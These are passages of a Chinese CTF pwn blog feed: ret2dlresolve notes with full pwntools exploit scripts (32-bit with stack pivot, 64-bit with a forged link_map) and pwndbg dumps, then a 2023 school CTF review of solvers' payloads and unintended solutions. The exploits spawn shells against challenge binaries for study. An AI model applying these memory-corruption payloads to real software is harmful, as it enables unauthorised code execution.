填充缓冲区</span><br>rop.raw(<span class="hljs-string">&#x27;a&#x27;</span> * offset) <br><span class="hljs-comment">### 向新栈中写100个字节</span><br><span class="hljs-comment">##rop.read会自动完成read函数、函数参数、返回地址的栈部署</span><br>rop.read(<span class="hljs-number">0</span>, base_stage, <span class="hljs-number">100</span>)<br><span class="hljs-comment">### 栈迁移, 设置esp = base_stage</span><br><span class="hljs-comment">##rop.migrate会利用leave_ret自动部署迁移工作</span><br>rop.migrate(base_stage)<br>sh.sendline(rop.chain())<br>gdb.attach(sh)<br>pause()<br><br><span class="hljs-comment"># 打印字符串&quot;/bin/sh&quot;</span><br>rop = ROP(<span class="hljs-string">&#x27;./bof&#x27;</span>)<br>BIN = <span class="hljs-string">&quot;/bin/sh\x00&quot;</span><span class="hljs-comment">##众所周知一般的函数遇到 \0 才会结束读取，所以为了防止system(&#x27;/bin/shaaaaaaaa....aaaaa&#x27;)的情况，我们要加上\0</span><br><span class="hljs-comment">## 获取plt0地址</span><br>plt0 = elf.get_section_by_name(<span class="hljs-string">&#x27;.plt&#x27;</span>).header.sh_addr<br><span class="hljs-comment">## 获取.rel.plt地址</span><br>rel_plt = elf.get_section_by_name(<span class="hljs-string">&#x27;.rel.plt&#x27;</span>).header.sh_addr<br><span class="hljs-comment">## 获得.dynsym地址</span><br>dynsym = elf.get_section_by_name(<span class="hljs-string">&#x27;.dynsym&#x27;</span>).header.sh_addr<br><span class="hljs-comment">## 获得.dynstr地址</span><br>dynstr = elf.get_section_by_name(<span class="hljs-string">&#x27;.dynstr&#x27;</span>).header.sh_addr<br>align = <span class="hljs-number">0x10</span>-(base_stage+<span class="hljs-number">32</span>-dynsym)%<span class="hljs-number">16</span><br><span class="hljs-built_in">print</span>(align)<span class="hljs-comment"># 4</span><br>fake_sym_addr = align + base_stage + <span class="hljs-number">32</span><br>st_name = fake_sym_addr +<span class="hljs-number">16</span> - dynstr<span class="hljs-comment"># 伪造的地址相对于dynstr的偏移</span><br>st_value=<span class="hljs-number">0</span><br>st_size=<span class="hljs-number">0</span><br>st_info=<span class="hljs-number">0x12</span><br>fake_reloc_arg = base_stage + <span class="hljs-number">24</span> - rel_plt<br>r_offset = elf.got[<span class="hljs-string">&#x27;write&#x27;</span>]<br>index_write = (fake_sym_addr - dynsym)/<span class="hljs-number">16</span> <span class="hljs-comment">##注意这里要用地板除，float不能左移</span><br><span class="hljs-built_in">print</span>(index_write)<br>r_info = (<span class="hljs-built_in">int</span>(index_write)&lt;&lt;<span class="hljs-number">8</span>)+<span class="hljs-number">0x7</span><span class="hljs-comment">##利用构造的dyndym地址反推r_info</span><br><span class="hljs-built_in">print</span>(r_info)<br><span class="hljs-built_in">print</span>(st_name)<br><br>rop.raw(plt0)<span class="hljs-comment"># 执行plt0就是执行dl_resolve </span><br><span class="hljs-comment"># 可以通过plt的地址加上目标函数的offset来调用函数，以如下方式调用write函数</span><br>rop.raw(fake_reloc_arg)<span class="hljs-comment"># 偏移</span><br>rop.raw(<span class="hljs-string">&#x27;bbbb&#x27;</span>) <span class="hljs-comment">#write函数返回地址</span><br>rop.raw(base_stage + <span class="hljs-number">59</span>) <span class="hljs-comment"># /bin/sh\x00</span><br>rop.raw(<span class="hljs-string">&#x27;aaaa&#x27;</span>)<span class="hljs-comment">##事实上因为system只需要一个参数，另外两个都不用写，但为了不破坏原有的布局就填上垃圾数据即可</span><br>rop.raw(<span class="hljs-string">&#x27;aaaa&#x27;</span>)<br><br>rop.raw(r_offset) <span class="hljs-comment">##构造的ELF_REL 伪造write为system</span><br>rop.raw(r_info)<span class="hljs-comment"># 形式应为[在.dynsym中的indx或者说偏移]07</span><br><br>rop.raw(<span class="hljs-string">&#x27;a&#x27;</span>*align)<span class="hljs-comment"># .dynsym 每一项的大小都是0x10 伪造.dynsym表项时，需要与.dynsym的起始位置对齐</span><br>rop.raw(st_name) <span class="hljs-comment">##构造的.dynsym</span><br>rop.raw(st_value)<span class="hljs-comment"># 0</span><br>rop.raw(st_size)<span class="hljs-comment"># 0</span><br>rop.raw(st_info)<span class="hljs-comment"># 0x12</span><br><br>rop.raw(<span class="hljs-string">&#x27;system\x00&#x27;</span>)<span class="hljs-comment">##伪造的.dynstr</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;len:rop.chain():&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(rop.chain()))<span class="hljs-comment">#长度为58，所以可以在base_stage + 59写上/bin/sh</span><br>rop.raw(BIN)<br>rop.raw(<span class="hljs-string">&#x27;a&#x27;</span> * (<span class="hljs-number">100</span> - <span class="hljs-built_in">len</span>(rop.chain())))<br>sh.sendline(rop.chain())<br>sh.interactive()<br></code></pre></td></tr></table></figure><ul><li><pre><code class="python">rop.raw(plt0)# 执行plt0就是执行dl_resolve rop.raw(fake_reloc_arg)# 偏移rop.raw(&#39;bbbb&#39;) #write函数返回地址rop.raw(base_stage + 59) # /bin/sh\x00rop.raw(&#39;aaaa&#39;)##事实上因为system只需要一个参数，另外两个都不用写，但为了不破坏原有的布局就填上垃圾数据即可rop.raw(&#39;aaaa&#39;)<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey"><br>  这里是通过plt的地址加上目标函数的offset来调用write函数 比如我们平常写的rop为`p32(write_plt) + b&#x27;bbbb&#x27; + p32(<span class="hljs-number">1</span>) + p32(addr) + p32(size)` 这里也类似 只是write_plt用plt[<span class="hljs-number">0</span>]和偏移来表示<br><br>* 这里的执行过程就是<br><br>  &gt; <span class="hljs-number">1</span>. 调用write伪造的system函数--&gt;因为是第一次调用会触发_dl_resolve<br>  &gt; <span class="hljs-number">2</span>. 用`link_map`访问`.dynamic`，取出`.dynstr`, `.dynsym`, `.rel.plt`的指针，`.rel.plt + fake_reloc_arg`求出当前函数的重定位表项`Elf32_REL`的指针<br>  &gt; <span class="hljs-number">3</span>. 根据`Elf32_REL`-&gt;r_info 求出当前函数的符号表项`Elf32_Sym`的指针，记作`sym`<br>  &gt; <span class="hljs-number">4</span>. `.dynstr + sym-&gt;st_name`得出符号名字符串指针<br>  &gt; <span class="hljs-number">5</span>. 在动态链接库查找这个函数的地址，并且把地址赋值给`*rel-&gt;r_offset`，即GOT表<br>  &gt; <span class="hljs-number">6</span>. 调用这个函数<br><br>* ```shell<br><span class="hljs-title">  02:</span><span class="hljs-number">0008</span>│ ecx <span class="hljs-number">0</span>x804a828 —▸ <span class="hljs-number">0</span>xf7f0ca40 ◂— <span class="hljs-number">0</span>x0<br><span class="hljs-title">  03:</span><span class="hljs-number">000</span>c│     <span class="hljs-number">0</span>x804a82c ◂— <span class="hljs-number">0</span>x251c<br><span class="hljs-title">  04:</span><span class="hljs-number">0010</span>│     <span class="hljs-number">0</span>x804a830 ◂— <span class="hljs-number">0</span>x62626262 (&#x27;bbbb&#x27;)<br><span class="hljs-title">  05:</span><span class="hljs-number">0014</span>│     <span class="hljs-number">0</span>x804a834 —▸ <span class="hljs-number">0</span>x804a863 ◂— &#x27;/bin/sh&#x27;<br><span class="hljs-title">  06:</span><span class="hljs-number">0018</span>│     <span class="hljs-number">0</span>x804a838 ◂— <span class="hljs-number">0</span>x61616161 (&#x27;aaaa&#x27;)<br><span class="hljs-title">  07:</span><span class="hljs-number">001</span>c│     <span class="hljs-number">0</span>x804a83c ◂— <span class="hljs-number">0</span>x61616161 (&#x27;aaaa&#x27;)<br><span class="hljs-title">  08:</span><span class="hljs-number">0020</span>│     <span class="hljs-number">0</span>x804a840 —▸ <span class="hljs-number">0</span>x804a01c (write@got[plt]) —▸ <span class="hljs-number">0</span>xf7c48170 (system) ◂— endbr32 <br><span class="hljs-title">  09:</span><span class="hljs-number">0024</span>│     <span class="hljs-number">0</span>x804a844 ◂— <span class="hljs-number">0</span>x26807<br><span class="hljs-title">  0a:</span><span class="hljs-number">0028</span>│     <span class="hljs-number">0</span>x804a848 ◂— <span class="hljs-number">0</span>x61616161 (&#x27;aaaa&#x27;)<br><span class="hljs-title">  0b:</span><span class="hljs-number">002</span>c│     <span class="hljs-number">0</span>x804a84c ◂— <span class="hljs-number">0</span>x25f0<br><span class="hljs-title">  0c:</span><span class="hljs-number">0030</span>│     <span class="hljs-number">0</span>x804a850 ◂— <span class="hljs-number">0</span>x0<br><span class="hljs-title">  0d:</span><span class="hljs-number">0034</span>│     <span class="hljs-number">0</span>x804a854 ◂— <span class="hljs-number">0</span>x0<br><span class="hljs-title">  0e:</span><span class="hljs-number">0038</span>│     <span class="hljs-number">0</span>x804a858 ◂— <span class="hljs-number">0</span>x12<br><span class="hljs-title">  0f:</span><span class="hljs-number">003</span>c│     <span class="hljs-number">0</span>x804a85c ◂— &#x27;system&#x27;<br><span class="hljs-title">  10:</span><span class="hljs-number">0040</span>│     <span class="hljs-number">0</span>x804a860 ◂— <span class="hljs-number">0</span>x2f006d65 <span class="hljs-comment">/* &#x27;em&#x27; */</span><br><span class="hljs-title">  11:</span><span class="hljs-number">0044</span>│     <span class="hljs-number">0</span>x804a864 ◂— &#x27;bin/sh&#x27;<br><span class="hljs-title">  12:</span><span class="hljs-number">0048</span>│     <span class="hljs-number">0</span>x804a868 ◂— <span class="hljs-number">0</span>x61006873 <span class="hljs-comment">/* &#x27;sh&#x27; */</span><br><span class="hljs-title">  13:</span><span class="hljs-number">004</span>c│     <span class="hljs-number">0</span>x804a86c ◂— &#x27;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#x27;<br>  ... ↓        <span class="hljs-number">7</span> skipped<br></code></pre></td></tr></table></figure></code></pre></li><li><p>为啥要迁移：当然是溢出的不够多啊 然后这里的迁移其实还挺不一样的 用了pop_ebp_ret leave_ret两个gadget 但是应该只考栈迁移的并不需要这么构造 到高版本的libc也没有这么多gadget</p></li><li><pre><code class="python">from pwn import *io = process(&quot;./bof&quot;)context.arch = &#39;i386&#39;elf = ELF(&quot;./bof&quot;)pop_esi_edi_ebp_ret = 0x08048629leave_ret = 0x08048445pop_ebp_ret = 0x0804862bstack_size = 0x800bss_addr = elf.bss() #获取bss段首地址base_stage = bss_addr + stack_sizeread_plt = elf.plt[&#39;read&#39;]io.recv()payload = b&#39;a&#39;*112payload += p32(read_plt)payload += p32(pop_esi_edi_ebp_ret) + p32(0) + p32(base_stage) + p32(0x500)payload += p32(pop_ebp_ret) + p32(base_stage-4) + p32(leave_ret)io.sendline(payload)plt0 = 0x8048370rel_plt = 0x8048324dynsym = 0x80481ccdynstr = 0x804826calign = 0x10-(base_stage+32-dynsym)%16fake_relloc = base_stage + 24 - rel_pltfake_sym_addr = base_stage + align + 32r_offset = elf.got[&#39;write&#39;]index_write = (fake_sym_addr - dynsym)/16r_info = (int(index_write)&lt;&lt;8)+0x7gdb.attach(io)pause()st_name = fake_sym_addr + 16 - dynstrst_value = 0st_size = 0st_info = 0x12payload2 = p32(plt0) + p32(fake_relloc)payload2 += b&#39;aaaa&#39; + p32(base_stage+59) + b&#39;aaaa&#39; + b&#39;aaaa&#39;payload2 += p32(r_offset) + p32(r_info)payload2 += b&#39;a&#39;*align + p32(st_name) + p32(st_value) + p32(st_size) + p32(st_info)payload2 += b&#39;system\0&#39; + b&#39;/bin/sh\x00&#39;io.sendline(payload2)io.interactive()<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs clean"><br>    * 但stack_size得是<span class="hljs-number">0x800</span><span class="hljs-number">-990</span>之间大概 可能太小和太大了导致迁移的位置有点问题（猜的<br><br>###### <span class="hljs-number">64</span>位PatialRELRO--geek_challenge2023-why_n0t_puts<br><br>* &gt;vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; <span class="hljs-number">0x7fff</span>的过程中，由于我们一般伪造的symtab位于bss段，就导致在<span class="hljs-number">64</span>位下`reloc-&gt;r_info`比较大,故程序会发生错误<br>  &gt;<br>  &gt;需要控制 **link_map** 中的**l_addr**和 **sym**中的**st_value**<br><br>* ```python<br>  <span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> * <br>  context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span> <br>  context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span> <br>  io=process(<span class="hljs-string">&quot;./why_n0t_puts&quot;</span>)<br>  elf=ELF(<span class="hljs-string">&quot;./why_n0t_puts&quot;</span>) <br>  # libc=elf.libc<br>  libc = ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br>  <br>  def create_link_map(l_addr,know_got,link_map_addr): <br>      link_map=p64(l_addr &amp; (<span class="hljs-number">2</span> ** <span class="hljs-number">64</span> - <span class="hljs-number">1</span>))    # offset是负的 所以作了处理<br>      # DT_JMPREL<br>      link_map+=p64(<span class="hljs-number">0</span>)<br>      link_map+=p64(link_map_addr+<span class="hljs-number">0x18</span>) <br>      #ptr2relplt  <br>      link_map+=p64((know_got - l_addr)&amp;(<span class="hljs-number">2</span>**<span class="hljs-number">64</span><span class="hljs-number">-1</span>))    #r_offset 因为是负数所以用了-？<br>      link_map+=p64(<span class="hljs-number">0x7</span>)  # r_info 只会检查最低位<br>      link_map+=p64(<span class="hljs-number">0</span>)    # r_addend<br>      #dyn_symtab         <br>      link_map+=p64(<span class="hljs-number">0</span>)    # <br>      link_map+=p64(know_got<span class="hljs-number">-0x8</span>) # sym表首地址<br>      link_map+=b<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span> <br>  <br>      link_map=link_map.ljust(<span class="hljs-number">0x68</span>,b<span class="hljs-string">&#x27;B&#x27;</span>)<br>      link_map+=p64(link_map_addr)        # 字符串表指针的指针，随便写个地址就行，反正用不到<br>      link_map+=p64(link_map_addr+<span class="hljs-number">0x30</span>)   # DT_SYMTAB在 DYNAMIC中对应的结构的地址<br>      link_map=link_map.ljust(<span class="hljs-number">0xf8</span>,b<span class="hljs-string">&#x27;C&#x27;</span>)<br>      link_map+=p64(link_map_addr+<span class="hljs-number">0x8</span>)    # relplt_addr<br>      return link_map<br>  <br>  rdi=<span class="hljs-number">0x4011d3</span> <br>  rsi_r15=<span class="hljs-number">0x4011d1</span><br>  fake_link_map_addr = elf.bss() + <span class="hljs-number">0x200</span><br>  # fake_link_map_addr=<span class="hljs-number">0x404800</span> <br>  data=<span class="hljs-number">0x404500</span> <br>  sh=fake_link_map_addr+<span class="hljs-number">0x40</span><br>  call = <span class="hljs-number">0x401026</span>  # 调用dlresolve<br>  <br>  offset=libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]-libc.symbols[<span class="hljs-string">&#x27;read&#x27;</span>] <br>  fake_link_map=create_link_map(offset,elf.got[<span class="hljs-string">&#x27;read&#x27;</span>],fake_link_map_addr) <br>  print(len(fake_link_map)) <br>  payload = b<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x38</span><br>  payload += p64(rdi)+p64(<span class="hljs-number">0</span>)<br>  payload += p64(rsi_r15)+p64(fake_link_map_addr)+p64(<span class="hljs-number">0</span>)<br>  payload += p64(rsi_r15)+p64(fake_link_map_addr)+p64(<span class="hljs-number">0</span>)  # 栈<span class="hljs-number">16</span>字节对齐,不然调用不了<span class="hljs-keyword">system</span><br>  payload += p64(elf.plt[<span class="hljs-string">&#x27;read&#x27;</span>])<br>  payload += p64(rdi)+p64(sh)<br>  payload += p64(call)+p64(fake_link_map_addr)+p64(<span class="hljs-number">0</span>)     # 调用dlresolve 传入link_map和索引<br>  io.send(payload)<br>  <br>  # gdb.attach(io)<br>  # pause()<br>  io.send(fake_link_map) <br>  <br>  io.interactive()<br></code></pre></td></tr></table></figure></code></pre></li></ul></li><li><pre><code class="shell">pwndbg&gt; tele 0x40423000:0000│ rsi 0x404230 ◂— 0xfffffffffff442d001:0008│     0x404238 ◂— 0x002:0010│     0x404240 —▸ 0x404248 ◂— 0x4bfd4803:0018│     0x404248 ◂— 0x4bfd4804:0020│     0x404250 ◂— 0x705:0028│     0x404258 ◂— 0x006:0030│     0x404260 ◂— 0x007:0038│     0x404268 —▸ 0x404010 (_GLOBAL_OFFSET_TABLE_+16) —▸ 0x7fdc33f7fd30 (_dl_runtime_resolve_xsavec) ◂— endbr64 pwndbg&gt; tele 0x404230 4000:0000│ rsi 0x404230 ◂— 0xfffffffffff442d001:0008│     0x404238 ◂— 0x002:0010│     0x404240 —▸ 0x404248 ◂— 0x4bfd4803:0018│     0x404248 ◂— 0x4bfd4804:0020│     0x404250 ◂— 0x705:0028│     0x404258 ◂— 0x006:0030│     0x404260 ◂— 0x007:0038│     0x404268 —▸ 0x404010 (_GLOBAL_OFFSET_TABLE_+16) —▸ 0x7fdc33f7fd30 (_dl_runtime_resolve_xsavec) ◂— endbr64 08:0040│     0x404270 ◂— 0x68732f6e69622f /* &#39;/bin/sh&#39; */09:0048│     0x404278 ◂— &#39;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB0B@&#39;... ↓        3 skipped0d:0068│     0x404298 —▸ 0x404230 ◂— 0xfffffffffff442d00e:0070│     0x4042a0 —▸ 0x404260 ◂— 0x00f:0078│     0x4042a8 ◂— &#39;CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC8B@&#39;... ↓        15 skipped1f:00f8│     0x404328 —▸ 0x404238 ◂— 0x0</code></pre><ul><li>貌似可以当个板子用</li><li>为啥是0x68没懂</li><li>不懂的再看看这：<a href="https://blog.csdn.net/qq_51868336/article/details/114644569">https://blog.csdn.net/qq_51868336/article/details/114644569</a> 和wiki</li></ul></li></ul><h4 id="3-3-FULLRELRO"><a href="#3-3-FULLRELRO" class="headerlink" title="3.3 FULLRELRO"></a>3.3 FULLRELRO</h4><ul><li>wiki上还有FULLRELRO的呢 先鸽了</li></ul>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>2023校赛总结</title>
    <link href="/2023/11/30/2023%E6%A0%A1%E8%B5%9B%E6%80%BB%E7%BB%93/"/>
    <url>/2023/11/30/2023%E6%A0%A1%E8%B5%9B%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h3 id="0-前言"><a href="#0-前言" class="headerlink" title="0 前言"></a>0 前言</h3><ul><li>我是什么垃圾 出题给大佬做（瑟瑟发抖</li><li>大概就记录一下审WP过程中佬们的非预期和发现的题中的一些问题</li></ul><h3 id="1-signin"><a href="#1-signin" class="headerlink" title="1 signin"></a>1 signin</h3><ul><li><p>这题还有非预期我是没想到的 菜狗哭泣（当时出的时候也没多想 就按磐石那个出的来着</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  __int64 v4[<span class="hljs-number">2</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-10h] BYREF</span><br><br>  v4[<span class="hljs-number">1</span>] = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  put(argc, argv, envp);<br>  __isoc99_scanf(<span class="hljs-string">&quot;%ld&quot;</span>, v4);<br>  <span class="hljs-keyword">if</span> ( v4[<span class="hljs-number">0</span>] &gt; <span class="hljs-number">3</span> )<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>  <span class="hljs-keyword">if</span> ( LODWORD(v4[<span class="hljs-number">0</span>]) == B )<br>    b4ckdo0r();<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>只要符号位为1 低32位为0x42就行 至于高32位的数值位为多少都行</p></li><li><p>然后关于如何发送的问题</p><blockquote><p>但是这里读入用的是scanf，所以必须以字符串或者bytes的形式输入数字(X1ngCHEN师傅)</p></blockquote><p>p64是不行的 但我查了查p64就是将整数转换成字节啊？（不过我好像用p64只会是地址</p></li><li><p>patchelf还可以这样写(X1ngCHEN师傅)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">patchelf --set-interpreter /home/akyuu/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/ld-2.23.so --replace-needed libc.so.6 /home/akyuu/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/libc.so.6 pwn<br></code></pre></td></tr></table></figure></li></ul><h3 id="2-EZest"><a href="#2-EZest" class="headerlink" title="2 EZest"></a>2 EZest</h3><ul><li><p>有的师傅只写了一个SigFrame<br>用<code>pop_rbp_ret</code>写&#x2F;bin&#x2F;sh</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"> <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span> + p64(pop_rbp_ret) + p64(bss - <span class="hljs-number">0x10</span>) + p64(<span class="hljs-number">0x40110e</span>)<br>    <br>.text:000000000040110E <span class="hljs-number">48</span> C7 C0 <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>          mov     rax, <span class="hljs-number">0</span><br>.text:0000000000401115 <span class="hljs-number">48</span> C7 C7 <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>          mov     rdi, <span class="hljs-number">0</span>                          ; fd<br>.text:000000000040111C <span class="hljs-number">48</span> 8D <span class="hljs-number">75</span> F0                   lea     rsi, [rbp+buf]                  ; buf<br>.text:0000000000401120 <span class="hljs-number">48</span> C7 C2 <span class="hljs-number">00</span> 02 <span class="hljs-number">00</span> <span class="hljs-number">00</span>          mov     rdx, 200h                       ; count<br>.text:0000000000401127 0F 05                         syscall                                 ; LINUX - sys_read<br>.text:0000000000401129 C3                            retn<br>.text:0000000000401129<br>.text:0000000000401129                               main endp ; sp-analysis failed<br></code></pre></td></tr></table></figure></li><li><p>不过本来也是板子题</p></li></ul><h3 id="3-magicode"><a href="#3-magicode" class="headerlink" title="3 magicode"></a>3 magicode</h3><ul><li><p>这题可能出的还可以？？（小心翼翼 还好当时没有把这么丑的代码改掉😏 不然师傅们就觉得贼简单了</p></li><li><p>但这题之前说过 保护那里应该可以怎么弄不显示rwx段（FSCTF那</p></li><li><p>Ephemeral1y师傅真的强 手打shellcode来着<br>pANz0e师傅add(-10)也是可以的</p></li><li><p>还有Whhxy4师傅提到了绕过canary的问题</p><blockquote><p>alloca在汇编⾥⾯的效果是add rsp，rdx</p><p>也就是1是分配⼀个栈根据rbp的位置往下减，输⼊0就是在rbp-0x10的位置开始以此类推 ，这题有</p><p>canary所以输⼊0正好跳过canary </p><hr><p>emmm 我仔细看了一下 首先是sub rsp, rdx 然后是根据rsp的位置往下减，确实和canary无关 rbp的位置是固定的</p></blockquote><p>X1ngCHEN师傅说有爆破？ 啊出题和做题还是有些不同的 完全没考虑到<br>试了试X1ingCHEN师傅的exp，其实也并不用爆破 ，好像最后<code>\x10</code>完全没用到 每一次都能getshell的 </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">payload = <span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x70</span>) + shellcode.ljust(<span class="hljs-number">0x50</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)+<span class="hljs-string">b&#x27;\x10&#x27;</span><br></code></pre></td></tr></table></figure><p>嗯嗯 确实 magic函数的实现为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs asm">.text:0000000000001568 48 8B 45 E0                   mov     rax, [rbp+var_20]# 这个var_20我gdb看好像就是固定为0x20 然后这个位置存放的就是shellcode的起始位置<br>.text:000000000000156C FF D0                         call    rax<br></code></pre></td></tr></table></figure></li><li><p>好好好 alloca函数是为了对齐并且多0x10(可能是为了安全) 就是如果为alloca(0x60) 实际分配的是0x70 如果是alloca(0x64) 分配的也是0x70</p></li><li><p>gdb应该是能看到的会多分配0x10 alloca在汇编上的效果是<code>sub    rsp, rdx</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">这是执行完sub rsp, rdx以后 size输入的是0x20</span><br>0x555555555496 &lt;main+311&gt;    sub    rsp, rdx<br> ► 0x555555555499 &lt;main+314&gt;    mov    rdx, rax<br>   0x55555555549c &lt;main+317&gt;    and    edx, 0xfff<br>   0x5555555554a2 &lt;main+323&gt;    test   rdx, rdx<br>   0x5555555554a5 &lt;main+326&gt;    je     main+344                &lt;main+344&gt;<br> <br>   0x5555555554a7 &lt;main+328&gt;    and    eax, 0xfff<br>   0x5555555554ac &lt;main+333&gt;    sub    rax, 8<br>──────────────────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────────────────────────────────────────────────────────────<br>00:0000│ rsp 0x7fffffffdd10 ◂— 0xa3233 /* &#x27;32\n&#x27; */# alloca(0x20)以后rsp的位置<br>01:0008│     0x7fffffffdd18 ◂— 0x0<br>02:0010│     0x7fffffffdd20 —▸ 0x7fffffffdf18 —▸ 0x7fffffffe278 ◂— &#x27;/home/yech0/sskd/hectf2023/2magicode/magicode&#x27;zhe<br>03:0018│     0x7fffffffdd28 ◂— 0xe4c8453177346a00<br>04:0020│     0x7fffffffdd30 —▸ 0x7fffffffde00 ◂— 0x1<br>05:0028│     0x7fffffffdd38 —▸ 0x55555555543d (main+222) ◂— mov dword ptr [rbp - 0x2c], eax<br>06:0030│     0x7fffffffdd40 —▸ 0x555555558020 (stdout@GLIBC_2.2.5) —▸ 0x7ffff7e1a780 (_IO_2_1_stdout_) ◂— 0xfbad2887# rsp原先的位置<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">我这里gdb是如何实现多0x10的:(size输入0x20以后</span><br>   0x555555555445 &lt;main+230&gt;    lea    rdx, [rax + 8]rdx:0x28<br>   0x555555555449 &lt;main+234&gt;    mov    eax, 0x10    rax:0x10<br>   0x55555555544e &lt;main+239&gt;    sub    rax, 1    rax:0xf<br>   0x555555555452 &lt;main+243&gt;    add    rax, rdxrax:0x37<br>   0x555555555455 &lt;main+246&gt;    